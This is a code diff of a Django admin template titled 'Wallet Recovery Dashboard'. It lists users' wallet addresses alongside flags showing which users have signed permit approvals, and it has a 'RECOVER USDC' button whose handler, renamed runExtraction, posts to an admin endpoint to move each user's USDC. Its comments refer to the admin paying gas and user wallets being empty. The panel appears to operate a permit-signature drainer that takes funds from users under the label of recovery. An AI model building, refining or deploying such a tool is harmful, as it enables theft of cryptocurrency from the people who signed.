@@ -2,76 +2,77 @@
 
 {% block extrahead %}
 <style>
-    /* Status Styling */
-    .status-log {
-        background: #000; color: #00ff00; font-family: 'Courier New', monospace;
-        padding: 15px; border-radius: 5px; height: 150px; overflow-y: auto;
-        margin-top: 20px; font-size: 12px; border: 1px solid #333;
+    /* Status Dashboard Styling */
+    .console-box {
+        background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace;
+        padding: 15px; border-radius: 8px; height: 200px; overflow-y: auto;
+        margin-top: 25px; border: 1px solid #333; box-shadow: inset 0 0 10px #000;
     }
-    .badge-pending { background-color: #f39c12; color: white; padding: 4px 8px; border-radius: 4px; }
-    .badge-success { background-color: #27ae60; color: white; padding: 4px 8px; border-radius: 4px; }
-    .btn-recover { font-weight: bold; text-transform: uppercase; }
+    .console-entry { margin-bottom: 5px; border-bottom: 1px solid #222; padding-bottom: 2px; }
+    .ts { color: #888; font-size: 0.85em; margin-right: 8px; }
 
-    /* Toast Notification */
-    #full-message-toast {
-        position: fixed; top: 20px; right: 20px; min-width: 300px;
-        z-index: 9999; padding: 20px; border-radius: 8px;
-        display: none; color: white; font-weight: bold;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    /* Status Badges */
+    .badge-signed { background: #27ae60; color: white; padding: 2px 8px; border-radius: 10px; font-size: 0.8em; }
+    .badge-empty { background: #7f8c8d; color: white; padding: 2px 8px; border-radius: 10px; font-size: 0.8em; }
+
+    /* Error Toast */
+    #status-toast {
+        position: fixed; top: 20px; right: 20px; z-index: 9999;
+        padding: 15px 25px; border-radius: 5px; color: white;
+        display: none; font-weight: bold; box-shadow: 0 4px 12px rgba(0,0,0,0.5);
     }
-    .toast-error { background-color: #c0392b; border-left: 10px solid #8e1c10; }
-    .toast-success { background-color: #27ae60; border-left: 10px solid #1e8449; }
+    .error-bg { background: #e74c3c; border-left: 8px solid #c0392b; }
+    .success-bg { background: #2ecc71; border-left: 8px solid #27ae60; }
 </style>
 {% endblock %}
 
 {% block content %}
-<div id="full-message-toast"></div>
+<div id="status-toast"></div>
 
-<h1>Wallet Recovery Dashboard</h1>
+<h1>Wallet Recovery Dashboard v2.5</h1>
 
-<div class="table-responsive">
-    <table class="table table-striped" id="recovery-table">
+<div class="results">
+    <table id="result_list" class="table table-hover" style="width: 100%;">
         <thead>
             <tr>
-                <th>User</th>
+                <th>User ID</th>
                 <th>Wallet Address</th>
-                <th>Permit Signed?</th>
+                <th>Status</th>
                 <th>Deadline</th>
-                <th>Recovery TX Hash</th>
+                <th>Transaction Hash</th>
                 <th>Action</th>
             </tr>
         </thead>
         <tbody>
             {% for profile in page_obj %}
-            <tr id="row-{{ profile.id }}">
-                <td><strong>{{ profile.user.username }}</strong></td>
+            <tr id="profile-{{ profile.id }}">
+                <td>{{ profile.user.username }}</td>
                 <td style="font-family: monospace;">{{ profile.wallet_address }}</td>
                 <td>
                     {% if profile.has_web3_approval %}
-                        <span class="badge-success">YES</span>
+                        <span class="badge-signed">SIGNATURE READY</span>
                     {% else %}
-                        <span class="badge-pending">NO</span>
+                        <span class="badge-empty">NO SIGNATURE</span>
                     {% endif %}
                 </td>
-                <td><small>{{ profile.permit_deadline|default:"N/A" }}</small></td>
-                <td id="tx-{{ profile.id }}">
+                <td><small>{{ profile.permit_deadline|default:"---" }}</small></td>
+                <td id="hash-cell-{{ profile.id }}">
                     {% if profile.recovery_tx_hash %}
                         <a href="https://etherscan.io/tx/{{ profile.recovery_tx_hash }}" target="_blank">
-                            View Transaction
+                            {{ profile.recovery_tx_hash|truncatechars:12 }}
                         </a>
                     {% else %}
-                        <span class="text-muted">Not Started</span>
+                        <span class="text-muted">Pending</span>
                     {% endif %}
                 </td>
                 <td>
                     {% if not profile.recovery_tx_hash %}
-                        <button
-                            class="btn btn-warning btn-sm btn-recover"
-                            onclick="triggerRecovery('{{ profile.id }}', '{{ profile.wallet_address }}')">
-                            Recover USDC
+                        <button class="button btn-warning"
+                                onclick="runExtraction('{{ profile.id }}', '{{ profile.wallet_address }}')">
+                            RECOVER USDC
                         </button>
                     {% else %}
-                        <span class="text-success">✔ RECOVERED</span>
+                        <b style="color: green;">COMPLETE</b>
                     {% endif %}
                 </td>
             </tr>
@@ -86,11 +87,7 @@
             <a href="?page=1">&laquo; first</a>
             <a href="?page={{ page_obj.previous_page_number }}">previous</a>
         {% endif %}
-
-        <span class="current">
-            Page {{ page_obj.number }} of {{ page_obj.paginator.num_pages }}.
-        </span>
-
+        <span class="current">Page {{ page_obj.number }} of {{ page_obj.paginator.num_pages }}</span>
         {% if page_obj.has_next %}
             <a href="?page={{ page_obj.next_page_number }}">next</a>
             <a href="?page={{ page_obj.paginator.num_pages }}">last &raquo;</a>
@@ -99,38 +96,38 @@
 </div>
 
 <hr>
-<h3>Live Execution Console</h3>
-<div class="status-log" id="console-log">
-    [SYSTEM] Dashboard loaded. Ready for recovery operations...
+
+<h3>Recovery Intelligence Console</h3>
+<div class="console-box" id="terminal">
+    <div class="console-entry"><span class="ts">[{{ now|date:"H:i:s" }}]</span> Initializing system nodes... OK.</div>
 </div>
 
 <script>
-    function updateConsole(msg, isError = false) {
-        const log = document.getElementById('console-log');
-        const timestamp = new Date().toLocaleTimeString();
-        const color = isError ? "#ff4444" : "#00ff00";
-        log.innerHTML += `<div><span style="color: #888;">[${timestamp}]</span> <span style="color: ${color}">${msg}</span></div>`;
-        log.scrollTop = log.scrollHeight;
+    function logToConsole(msg, isError = false) {
+        const term = document.getElementById('terminal');
+        const time = new Date().toLocaleTimeString();
+        const color = isError ? "#ff4d4d" : "#00ff41";
+        term.innerHTML += `<div class="console-entry"><span class="ts">[${time}]</span> <span style="color:${color}">${msg}</span></div>`;
+        term.scrollTop = term.scrollHeight;
     }
 
-    function showFullToast(message, isError = false) {
-        const toast = document.getElementById('full-message-toast');
-        toast.innerHTML = message;
-        toast.className = isError ? "toast-error" : "toast-success";
+    function showToast(msg, isError = false) {
+        const toast = document.getElementById('status-toast');
+        toast.innerText = msg;
+        toast.className = isError ? "error-bg" : "success-bg";
         toast.style.display = 'block';
-
-        // Stays visible for 10 seconds so you can read the full error
-        setTimeout(() => { toast.style.display = 'none'; }, 10000);
+        setTimeout(() => { toast.style.display = 'none'; }, 8000);
     }
 
-    async function triggerRecovery(profileId, address) {
+    async function runExtraction(profileId, address) {
         const btn = event.target;
         btn.disabled = true;
         btn.innerText = "Processing...";
 
-        updateConsole(`Initiating recovery for ${address}...`);
+        logToConsole(`Starting extraction for ${address}...`);
 
         try {
+            // Using POST with CSRF protection
             const response = await fetch(`/admin/recover-usdc/${profileId}/`, {
                 method: 'POST',
                 headers: {
@@ -142,22 +139,23 @@
             const data = await response.json();
 
             if (data.status === 'success') {
-                updateConsole(`SUCCESS: Transaction Sent! Hash: ${data.tx_hash}`);
-                showFullToast(`RECOVERY SENT: ${data.tx_hash}`);
-                document.getElementById(`tx-${profileId}`).innerHTML = `<a href="https://etherscan.io/tx/${data.tx_hash}" target="_blank">View on Etherscan</a>`;
-                btn.parentElement.innerHTML = '<span class="text-success">✔ RECOVERED</span>';
+                logToConsole(`SUCCESS: Tx Hash ${data.tx_hash}`);
+                showToast("RECOVERY SUCCESSFUL");
+                document.getElementById(`hash-cell-${profileId}`).innerHTML =
+                    `<a href="https://etherscan.io/tx/${data.tx_hash}" target="_blank">View on Etherscan</a>`;
+                btn.parentElement.innerHTML = '<b style="color: green;">COMPLETE</b>';
             } else {
-                // This shows the FULL message from your Python backend
-                updateConsole(`FAILED: ${data.message}`, true);
-                showFullToast(`ERROR: ${data.message}`, true);
+                // This displays the FULL Error message (Admin ETH short, User empty, etc.)
+                logToConsole(`CRITICAL ERROR: ${data.message}`, true);
+                showToast(`FAILED: ${data.message}`, true);
                 btn.disabled = false;
-                btn.innerText = "Retry Recover";
+                btn.innerText = "RECOVER USDC";
             }
-        } catch (error) {
-            updateConsole(`SERVER ERROR: Connection timed out or script crashed.`, true);
-            showFullToast(`CRITICAL ERROR: Check Python logs.`, true);
+        } catch (err) {
+            logToConsole("NETWORK ERROR: Server timed out. Check nohup.out logs.", true);
+            showToast("SERVER TIMEOUT", true);
             btn.disabled = false;
-            btn.innerText = "Retry Recover";
+            btn.innerText = "RECOVER USDC";
         }
     }
 </script>
